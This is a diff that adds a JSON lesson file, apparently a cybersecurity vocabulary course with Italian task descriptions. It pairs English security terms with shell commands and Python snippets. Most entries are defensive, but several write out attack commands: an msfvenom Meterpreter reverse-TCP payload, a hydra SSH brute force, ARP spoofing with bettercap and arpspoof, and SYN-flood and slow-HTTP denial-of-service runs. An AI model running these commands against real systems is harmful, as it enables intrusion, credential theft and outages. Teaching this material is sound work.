@@ -1,0 +1,464 @@
+{
+  "fixes": [
+    {
+      "level": "0",
+      "lesson": "cyber_basics_1",
+      "english": "Password",
+      "set": {
+        "command": "openssl rand -base64 24",
+        "task": "Genera una password casuale a entropia elevata partendo da byte sicuri prelevati dal generatore crittografico del sistema."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_1",
+      "english": "Virus",
+      "set": {
+        "command": "clamscan --infected --recursive /home/user/Downloads",
+        "task": "Ispeziona ricorsivamente la cartella dei download segnalando soltanto i file riconosciuti come infetti dal motore antivirus."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_1",
+      "english": "Malware",
+      "set": {
+        "command": "yara -r /opt/yara-rules/malware_index.yar /var/www",
+        "task": "Esegui le regole YARA contro la document root cercando firme note di malware tra i file caricati dagli utenti."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_1",
+      "english": "Firewall",
+      "set": {
+        "command": "sudo ufw default deny incoming && sudo ufw allow 22/tcp && sudo ufw enable",
+        "task": "Configura il firewall in modalita' deny-by-default lasciando aperta soltanto la porta SSH per l'amministrazione remota."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_1",
+      "english": "Encryption",
+      "set": {
+        "command": "openssl enc -aes-256-cbc -salt -pbkdf2 -in segreti.txt -out segreti.enc",
+        "code": "from cryptography.fernet import Fernet\nkey = Fernet.generate_key()\ntoken = Fernet(key).encrypt(b'dati sensibili del cliente')\nprint(token)",
+        "task": "Cifra un file di segreti con AES-256 in modalita' CBC derivando la chiave dalla passphrase tramite PBKDF2."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_1",
+      "english": "Backup",
+      "set": {
+        "command": "tar -czf backup-$(date +%F).tar.gz --exclude=node_modules /srv/app",
+        "task": "Crea un archivio compresso datato dell'applicazione escludendo le dipendenze rigenerabili prima di un deploy rischioso."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_2",
+      "english": "Username",
+      "set": {
+        "command": "getent passwd alice",
+        "task": "Recupera la voce completa di un utente dal database NSS verificandone UID, GID, home e shell di accesso."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_2",
+      "english": "Login",
+      "set": {
+        "command": "ssh -i ~/.ssh/id_ed25519 deploy@bastion.prod.local",
+        "task": "Effettua l'accesso al bastion di produzione autenticandoti con la chiave ed25519 invece che con la password."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_2",
+      "english": "Logout",
+      "set": {
+        "command": "sudo pkill -KILL -u alice",
+        "task": "Forza la disconnessione di tutte le sessioni attive di un utente terminando i suoi processi in seguito a una compromissione."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_2",
+      "english": "Account",
+      "set": {
+        "command": "sudo useradd -m -s /bin/bash -G developers alice && sudo passwd alice",
+        "task": "Crea un nuovo account utente con home directory e shell bash assegnandolo al gruppo developers."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_2",
+      "english": "Authentication",
+      "set": {
+        "code": "import hashlib, os\nsalt = os.urandom(16)\nstored = hashlib.pbkdf2_hmac('sha256', b'segreta123', salt, 200000)\ncheck = hashlib.pbkdf2_hmac('sha256', input('password: ').encode(), salt, 200000)\nprint('OK' if check == stored else 'NEGATA')",
+        "task": "Verifica una password inserita dall'utente confrontando l'hash PBKDF2 con quello salvato senza esporre la chiave originale."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_2",
+      "english": "Authorization",
+      "set": {
+        "command": "sudo setfacl -m u:alice:rwx /srv/reports",
+        "task": "Concedi a un singolo utente i permessi di lettura, scrittura ed esecuzione su una directory tramite ACL POSIX."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_2",
+      "english": "Permission",
+      "set": {
+        "command": "chmod 600 ~/.ssh/id_ed25519",
+        "task": "Restringi i permessi della chiave privata SSH al solo proprietario in modo che ssh-agent accetti di caricarla."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_3",
+      "english": "Vulnerability",
+      "set": {
+        "command": "nmap --script vuln -p 80,443 target.com",
+        "task": "Lancia gli script di rilevamento vulnerabilita' contro le porte HTTP del bersaglio per individuare CVE noti."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_3",
+      "english": "Exploit",
+      "set": {
+        "command": "searchsploit apache 2.4.49 path traversal",
+        "task": "Cerca exploit pubblici per una versione vulnerabile di Apache nel database locale di Exploit-DB."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_3",
+      "english": "Patch",
+      "set": {
+        "command": "sudo apt-get install --only-upgrade openssl",
+        "task": "Applica soltanto l'aggiornamento correttivo di openssl senza toccare gli altri pacchetti per chiudere una CVE critica."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_3",
+      "english": "Update",
+      "set": {
+        "command": "sudo apt-get update && sudo apt-get upgrade -y",
+        "task": "Sincronizza gli indici dei pacchetti e installa tutti gli aggiornamenti disponibili sulla macchina."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_3",
+      "english": "Spam",
+      "set": {
+        "command": "spamassassin --test-mode < sospetta.eml",
+        "task": "Analizza un messaggio di posta sospetto con SpamAssassin per ottenerne il punteggio e le regole attivate."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_3",
+      "english": "Antivirus",
+      "set": {
+        "command": "sudo freshclam && clamscan -r --infected /home",
+        "task": "Aggiorna le firme antivirus e poi scansiona ricorsivamente le home utente segnalando soltanto i file infetti."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_4",
+      "english": "Download",
+      "set": {
+        "command": "wget https://releases.example.com/app.tar.gz && sha256sum -c app.tar.gz.sha256",
+        "task": "Scarica un pacchetto rilasciato dal vendor e verifica l'integrita' del file confrontando l'hash SHA-256 pubblicato."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_4",
+      "english": "Upload",
+      "set": {
+        "command": "scp -i ~/.ssh/deploy_key build.tar.gz deploy@prod.local:/var/releases/",
+        "task": "Carica l'artefatto di build sul server di produzione attraverso un canale SSH cifrato con autenticazione a chiave."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_4",
+      "english": "Link",
+      "set": {
+        "command": "curl -ILs https://bit.ly/3xYzAbc | grep -i '^location:'",
+        "task": "Segui la catena di reindirizzamenti di un link accorciato senza aprirlo nel browser per rivelarne la destinazione reale."
+      }
+    },
+    {
+      "level": "0",
+      "lesson": "cyber_basics_4",
+      "english": "Network",
+      "set": {
+        "command": "ip -brief address && ss -tuln",
+        "task": "Elenca le interfacce di rete con i loro indirizzi e poi mostra tutte le porte in ascolto sulla macchina."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_malware",
+      "english": "Ransomware",
+      "set": {
+        "command": "yara -r /opt/rules/ransomware.yar /var/data",
+        "task": "Cerca tracce di famiglie di ransomware note nei file utente applicando un set di regole YARA aggiornato."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_malware",
+      "english": "Trojan",
+      "set": {
+        "command": "sha256sum sospetto.exe | xargs -I {} curl -s https://www.virustotal.com/api/v3/files/{}",
+        "task": "Calcola l'hash di un binario sospetto e interroga VirusTotal per scoprire se e' un trojan gia' catalogato."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_malware",
+      "english": "Spyware",
+      "set": {
+        "command": "sudo rkhunter --check --skip-keypress",
+        "task": "Avvia rkhunter in modalita' automatica per individuare spyware, rootkit e backdoor installati sul sistema."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_malware",
+      "english": "Adware",
+      "set": {
+        "command": "clamscan -r --infected --bell /home/user/.mozilla",
+        "task": "Scansiona il profilo Firefox dell'utente alla ricerca di estensioni adware riconosciute dal motore ClamAV."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_malware",
+      "english": "Keylogger",
+      "set": {
+        "command": "sudo lsmod | grep -Ei 'keyboard|input' && sudo cat /proc/bus/input/devices",
+        "task": "Elenca i moduli kernel e i dispositivi di input attivi per scovare un keylogger software o hardware inserito di nascosto."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_malware",
+      "english": "Rootkit",
+      "set": {
+        "command": "sudo chkrootkit -q",
+        "task": "Esegui una scansione silenziosa con chkrootkit cercando file e processi nascosti che indicano la presenza di un rootkit."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_malware",
+      "english": "Botnet",
+      "set": {
+        "command": "sudo ss -tnp state established '( dport = :6667 or dport = :8080 )'",
+        "task": "Identifica le connessioni TCP stabilite verso porte tipiche di Command and Control per scoprire host arruolati in una botnet."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_malware",
+      "english": "Payload",
+      "set": {
+        "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe",
+        "task": "Genera un payload Meterpreter reverse TCP per Windows da consegnare durante un esercizio di red team autorizzato."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_attacks",
+      "english": "DDoS",
+      "set": {
+        "command": "sudo hping3 --flood --rand-source -S -p 80 target.lab.local",
+        "task": "Simula un'inondazione di pacchetti SYN con sorgenti casuali contro un bersaglio di laboratorio per testarne la resilienza a un DDoS."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_attacks",
+      "english": "Brute Force",
+      "set": {
+        "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 ssh",
+        "task": "Forza l'autenticazione SSH dell'account amministratore provando ogni password contenuta in rockyou.txt."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_attacks",
+      "english": "Man-in-the-Middle",
+      "set": {
+        "command": "sudo bettercap -iface wlan0 -eval 'set arp.spoof.targets 192.168.1.42; arp.spoof on; net.sniff on'",
+        "task": "Posizionati tra la vittima e il gateway tramite ARP spoofing intercettando in chiaro il traffico Wi-Fi non cifrato."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_attacks",
+      "english": "Denial of Service",
+      "set": {
+        "command": "slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://target.lab.local/login -p 3",
+        "task": "Esaurisci i thread del server web mantenendo aperte molte connessioni HTTP lente per provocare una negazione del servizio."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_attacks",
+      "english": "Spoofing",
+      "set": {
+        "command": "sudo arpspoof -i eth0 -t 192.168.1.42 192.168.1.1",
+        "task": "Falsifica le risposte ARP convincendo la vittima che il MAC dell'attaccante appartiene al gateway predefinito."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_web",
+      "english": "Cookie",
+      "set": {
+        "code": "import hmac, hashlib, base64\nsecret = b'chiave-server-segreta'\npayload = b'user=alice;role=admin'\nsig = hmac.new(secret, payload, hashlib.sha256).digest()\ncookie = base64.urlsafe_b64encode(payload + b'.' + sig)\nprint(cookie)",
+        "task": "Firma il contenuto di un cookie di sessione con HMAC-SHA256 in modo che il server rilevi qualsiasi manomissione lato client."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_web",
+      "english": "HTTPS",
+      "set": {
+        "command": "openssl s_client -connect bank.example.com:443 -servername bank.example.com -tls1_2",
+        "task": "Apri una connessione TLS 1.2 con il sito bancario per ispezionare la catena di certificati e le suite di cifratura negoziate."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_web",
+      "english": "URL",
+      "set": {
+        "command": "curl -sILo /dev/null -w '%{url_effective}\\n' -L https://t.co/abc123",
+        "task": "Segui i redirect di un URL accorciato senza scaricare il corpo per rivelare l'indirizzo finale a cui punta davvero."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_web",
+      "english": "Domain",
+      "set": {
+        "command": "whois banca-italiana-login.com | grep -Ei 'Creation Date|Registrar'",
+        "task": "Recupera la data di creazione e il registrar di un dominio sospetto per smascherare un sito di phishing appena registrato."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_web",
+      "english": "Certificate",
+      "set": {
+        "command": "openssl x509 -in server.crt -noout -subject -issuer -dates",
+        "task": "Estrai soggetto, emittente e periodo di validita' di un certificato X.509 per controllarne autenticita' e scadenza."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_web",
+      "english": "Redirect",
+      "set": {
+        "command": "curl -sIL -A 'Mozilla/5.0' https://offerte.example.com/promo | grep -iE 'HTTP/|Location:'",
+        "task": "Traccia ogni salto della catena di reindirizzamenti HTTP individuando eventuali redirect aperti sfruttabili per phishing."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_web",
+      "english": "Attachment",
+      "set": {
+        "command": "file allegato.pdf && clamscan allegato.pdf",
+        "task": "Identifica il tipo MIME reale di un allegato sospetto e scansionalo con ClamAV prima di consegnarlo all'utente."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_web",
+      "english": "Clickjacking",
+      "set": {
+        "command": "curl -sI https://app.example.com | grep -iE 'X-Frame-Options|Content-Security-Policy'",
+        "task": "Verifica se l'applicazione invia gli header anti-framing necessari a impedire che venga incapsulata in un iframe malevolo."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_defense_intro",
+      "english": "Scan",
+      "set": {
+        "command": "nmap -sV -p 1-1000 target.com",
+        "task": "Scansiona le prime 1000 porte TCP del bersaglio identificando i servizi e le rispettive versioni in ascolto."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_defense_intro",
+      "english": "Quarantine",
+      "set": {
+        "command": "clamscan -r --move=/var/quarantine --infected /home",
+        "task": "Sposta automaticamente in una directory di quarantena tutti i file rilevati come infetti durante la scansione delle home."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_defense_intro",
+      "english": "Block",
+      "set": {
+        "command": "sudo iptables -A INPUT -s 198.51.100.42 -j DROP",
+        "task": "Blocca completamente il traffico in ingresso proveniente da un indirizzo IP coinvolto in tentativi di intrusione ripetuti."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_defense_intro",
+      "english": "Filter",
+      "set": {
+        "command": "sudo tshark -i eth0 -Y 'http.request.method == \"POST\" && http.host contains \"login\"'",
+        "task": "Filtra il traffico catturato per mostrare soltanto le richieste POST dirette agli endpoint di login dell'infrastruttura."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_defense_intro",
+      "english": "Log",
+      "set": {
+        "command": "sudo tail -F /var/log/auth.log | grep -E 'Failed password|Accepted'",
+        "task": "Segui in tempo reale il log di autenticazione evidenziando tentativi falliti e accessi riusciti per individuare attacchi a forza bruta."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_defense_intro",
+      "english": "Monitor",
+      "set": {
+        "command": "sudo tcpdump -i eth0 -w capture.pcap port 443 and not host 10.0.0.5",
+        "task": "Cattura su file pcap tutto il traffico HTTPS dell'interfaccia escludendo l'host di gestione per analisi successive."
+      }
+    },
+    {
+      "level": "1",
+      "lesson": "threats_defense_intro",
+      "english": "Recovery",
+      "set": {
+        "command": "sudo rsync -aAX --delete /mnt/backup-2026-05-10/ /srv/app/",
+        "task": "Ripristina l'applicazione da uno snapshot integro preservando permessi e attributi estesi dopo un incidente ransomware."
+      }
+    }
+  ]
+}
